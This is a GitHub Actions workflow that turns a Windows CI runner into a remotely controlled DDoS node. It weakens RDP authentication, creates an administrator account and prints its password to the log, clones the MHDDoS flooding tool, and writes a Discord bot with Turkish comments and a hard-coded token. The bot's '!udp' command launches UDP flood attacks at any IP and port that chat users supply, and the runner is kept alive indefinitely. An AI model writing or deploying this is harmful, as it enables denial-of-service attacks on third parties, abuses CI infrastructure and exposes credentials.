name: RDP

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-latest
    timeout-minutes: 3600

    steps:
      - name: Configure Core RDP Settings
        run: |
          # Enable Remote Desktop and disable Network Level Authentication
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
                             -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' `
                             -Name "SecurityLayer" -Value 0 -Force

          # Remove any existing rule with the same name
          netsh advfirewall firewall delete rule name="RDP-Tailscale"
          
          # Allow incoming connection on port 3389
          netsh advfirewall firewall add rule name="RDP-Tailscale" `
            dir=in action=allow protocol=TCP localport=3389

          # Restart the Remote Desktop service
          Restart-Service -Name TermService -Force

      - name: Create RDP User with Secure Password
        run: |
          Add-Type -AssemblyName System.Security
          $charSet = @{
              Upper   = [char[]](65..90)      # A-Z
              Lower   = [char[]](97..122)     # a-z
              Number  = [char[]](48..57)      # 0-9
              Special = ([char[]](33..47) + [char[]](58..64) +
                         [char[]](91..96) + [char[]](123..126)) # Special characters
          }
          $rawPassword = @()
          $rawPassword += $charSet.Upper | Get-Random -Count 4
          $rawPassword += $charSet.Lower | Get-Random -Count 4
          $rawPassword += $charSet.Number | Get-Random -Count 4
          $rawPassword += $charSet.Special | Get-Random -Count 4
          $password = -join ($rawPassword | Sort-Object { Get-Random })
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
          
          echo "RDP_CREDS=User: RDP | Password: $password" >> $env:GITHUB_ENV
          
          if (-not (Get-LocalUser -Name "RDP")) {
              Write-Error "User creation failed"
              exit 1
          }

      - name: Install Tailscale
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
          $installerPath = "$env:TEMP\tailscale.msi"
          
          Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
          Start-Process msiexec.exe -ArgumentList "/i", "`"$installerPath`"", "/quiet", "/norestart" -Wait
          Remove-Item $installerPath -Force

      - name: Establish Tailscale Connection
        run: |
          # Bring up Tailscale with the provided auth key
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$env:GITHUB_RUN_ID
          
          # Wait for Tailscale to assign an IP
          $tsIP = $null
          $retries = 0
          while (-not $tsIP -and $retries -lt 10) {
              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
              Start-Sleep -Seconds 5
              $retries++
          }
          
          if (-not $tsIP) {
              Write-Error "Tailscale IP not assigned. Exiting."
              exit 1
          }
          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
      
      - name: Verify RDP Accessibility
        run: |
          Write-Host "Tailscale IP: $env:TAILSCALE_IP"
          
          # Test connectivity using Test-NetConnection
          $testResult = Test-NetConnection -ComputerName $env:TAILSCALE_IP -Port 3389
          if (-not $testResult.TcpTestSucceeded) {
              Write-Error "TCP connection to RDP port 3389 failed"
              exit 1
          }
          Write-Host "TCP connectivity successful!"

      - name: Install Python and Git
        run: |
          # Install Python
          Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe" -OutFile "$env:TEMP\python-installer.exe"
          Start-Process -FilePath "$env:TEMP\python-installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
          
          # Install Git
          Invoke-WebRequest -Uri "https://github.com/git-for-windows/git/releases/download/v2.33.1.windows.1/Git-2.33.1-64-bit.exe" -OutFile "$env:TEMP\git-installer.exe"
          Start-Process -FilePath "$env:TEMP\git-installer.exe" -ArgumentList "/VERYSILENT" -Wait
          
          # Refresh PATH
          $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH", "Machine") + ";" + [System.Environment]::GetEnvironmentVariable("PATH", "User")

      - name: Clone MHDDoS and Install Dependencies
        run: |
          # Create Desktop directory if it doesn't exist
          if (-not (Test-Path "C:\Users\RDP\Desktop")) {
              New-Item -ItemType Directory -Path "C:\Users\RDP\Desktop"
          }
          
          # Clone MHDDoS
          cd "C:\Users\RDP\Desktop"
          git clone https://github.com/MHProDev/MHDDoS.git
          
          # Install requirements
          cd MHDDoS
          python -m pip install -r requirements.txt

      - name: Create Discord Bot Script
        run: |
          $botCode = @"
          import discord
          import asyncio
          import subprocess
          import re
          import os
          import signal
          from datetime import datetime
          
          # Bot token'ƒ± buraya girin
          BOT_TOKEN = "MTQzMDYyNzc2OTMxNzk4NjM4NQ.G_VIV5.otgPTwQ92MRF-gzXUhVtcT4WOLCwggjAeD0nuk"
          
          # MHDDoS dizini
          MHDDOS_PATH = "C:\\Users\\RDP\\Desktop\\MHDDoS"
          
          # Discord client'ƒ± ayarla
          intents = discord.Intents.default()
          intents.message_content = True
          client = discord.Client(intents=intents)
          
          # Aktif s√ºre√ßleri takip etmek i√ßin
          active_processes = []
          
          @client.event
          async def on_ready():
              print(f'Bot giri≈ü yaptƒ±: {client.user}')
              print('------')
              # Botun √ßalƒ±≈ütƒ±ƒüƒ±nƒ± belirten bir mesaj g√∂nder
              channel = discord.utils.get(client.get_all_channels(), name="general")
              if channel:
                  await channel.send(f"‚úÖ Bot aktif! {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
          
          @client.event
          async def on_message(message):
              # Botun kendi mesajlarƒ±nƒ± yok say
              if message.author == client.user:
                  return
          
              # Komut kontrol√º
              if message.content.startswith('!udp'):
                  # Komut parametrelerini ayƒ±r
                  parts = message.content.split()
                  
                  # Parametre sayƒ±sƒ± kontrol√º
                  if len(parts) != 4:
                      await message.channel.send("‚ùå Hatalƒ± kullanƒ±m! Doƒüru format: `!udp IP PORT S√úRE`")
                      return
                  
                  ip = parts[1]
                  port = parts[2]
                  duration = parts[3]
          
                  # IP adresi doƒürulama
                  if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
                      await message.channel.send("‚ùå Ge√ßersiz IP adresi formatƒ±!")
                      return
                  
                  # Port doƒürulama
                  try:
                      port = int(port)
                      if not (1 <= port <= 65535):
                          raise ValueError
                  except ValueError:
                      await message.channel.send("‚ùå Port 1-65535 arasƒ±nda olmalƒ±!")
                      return
                  
                  # S√ºre doƒürulama
                  try:
                      duration = int(duration)
                      if not (1 <= duration <= 300):
                          raise ValueError
                  except ValueError:
                      await message.channel.send("‚ùå S√ºre 1-300 saniye arasƒ±nda olmalƒ±!")
                      return
          
                  # Komutu olu≈ütur
                  command = [
                      "python",
                      "start.py",
                      "udp",
                      f"{ip}:{port}",
                      "10000",  # Sabit paket hƒ±zƒ±
                      str(duration)
                  ]
          
                  # MHDDoS dizinine ge√ß
                  original_dir = os.getcwd()
                  os.chdir(MHDDOS_PATH)
          
                  try:
                      # Komutu √ßalƒ±≈ütƒ±r
                      process = await asyncio.create_subprocess_exec(
                          *command,
                          stdout=asyncio.subprocess.PIPE,
                          stderr=asyncio.subprocess.PIPE
                      )
                      
                      # S√ºreci listeye ekle
                      active_processes.append(process)
                      
                      # Ba≈ülangƒ±√ß mesajƒ±
                      await message.channel.send(
                          f"‚úÖ Saldƒ±rƒ± ba≈ülatƒ±ldƒ±!\n"
                          f"üéØ Hedef: {ip}:{port}\n"
                          f"‚è±Ô∏è S√ºre: {duration} saniye\n"
                          f"üì¶ Paket Hƒ±zƒ±: 10000 pps"
                      )
                      
                      # √áƒ±ktƒ±larƒ± bekle (asenkron)
                      stdout, stderr = await process.communicate()
                      
                      # S√ºreci listeden √ßƒ±kar
                      if process in active_processes:
                          active_processes.remove(process)
                      
                      # Sonu√ßlarƒ± kontrol et
                      if process.returncode == 0:
                          await message.channel.send("‚úÖ Saldƒ±rƒ± ba≈üarƒ±yla tamamlandƒ±!")
                      else:
                          error_msg = stderr.decode().strip() if stderr else "Bilinmeyen hata"
                          await message.channel.send(f"‚ùå Saldƒ±rƒ± sƒ±rasƒ±nda hata olu≈ütu:\n```\n{error_msg}\n```")
                          
                  except Exception as e:
                      await message.channel.send(f"‚ùå Saldƒ±rƒ± ba≈ülatƒ±lƒ±rken hata: `{str(e)}`")
                  finally:
                      # Orijinal dizine geri d√∂n
                      os.chdir(original_dir)
          
              # T√ºm saldƒ±rƒ±larƒ± durdur
              elif message.content == '!stop':
                  if not active_processes:
                      await message.channel.send("‚ùå Aktif saldƒ±rƒ± bulunamadƒ±!")
                      return
          
                  stopped_count = 0
                  for process in active_processes:
                      try:
                          process.terminate()
                          await process.wait()
                          stopped_count += 1
                      except:
                          try:
                              process.kill()
                              await process.wait()
                              stopped_count += 1
                          except:
                              pass
                  
                  # Listeyi temizle
                  active_processes.clear()
                  
                  await message.channel.send(f"‚úÖ {stopped_count} saldƒ±rƒ± durduruldu!")
          
          # Botu ba≈ülat
          client.run(BOT_TOKEN)
          "@
          
          # Bot kodunu dosyaya yaz
          $botCode | Out-File -FilePath "C:\Users\RDP\Desktop\discord_bot.py" -Encoding UTF8

      - name: Start Discord Bot
        run: |
          # Botu ba≈ülat
          Start-Process python -ArgumentList "C:\Users\RDP\Desktop\discord_bot.py" -NoNewWindow

      - name: Maintain Connection
        run: |
          Write-Host "`n=== RDP ACCESS ==="
          Write-Host "Address: $env:TAILSCALE_IP"
          Write-Host "Username: RDP"
          Write-Host "Password: $(echo $env:RDP_CREDS)"
          Write-Host "==================`n"
          
          # Keep runner active indefinitely (or until manually cancelled)
          while ($true) {
              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
              Start-Sleep -Seconds 300
          }
